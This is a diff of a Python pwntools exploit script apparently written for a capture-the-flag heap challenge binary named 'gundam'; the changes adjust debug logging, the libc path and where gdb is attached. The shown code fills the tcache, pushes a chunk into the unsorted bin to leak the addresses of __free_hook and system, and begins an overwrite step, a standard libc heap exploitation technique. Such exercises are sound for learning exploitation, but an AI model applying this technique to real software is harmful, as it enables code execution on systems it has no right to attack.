@@ -2,11 +2,11 @@
 
 from pwn import *
 
-#context.log_level = 'debug'
+context.log_level = 'debug'
 
-io = process(['./gundam'], env={'LD_PRELOAD':'./gundam_libc-2.26.so'})
+io = process(['./gundam'])
 #elf = ELF('gundam')
-libc = ELF('./gundam_libc-2.26.so')
+libc = ELF('./gundam_libc.so.6')
 
 def build(name):
     io.sendlineafter("choice : ", '1')
@@ -27,11 +27,11 @@ def leak():
     global __free_hook_addr
     global system_addr
 
-    gdb.attach(io)
     for i in range(9):
         build('A'*7)
     for i in range(7):
         destroy(i)      # tcache bin
+    gdb.attach(io)
     destroy(7)          # unsorted bin
 
     blow_up()
@@ -49,6 +49,7 @@ def leak():
     log.info("system address: 0x%x" % system_addr)
 
 def overwrite():
+    gdb.attach(io)
     destroy(2)
     destroy(1)
     destroy(0)
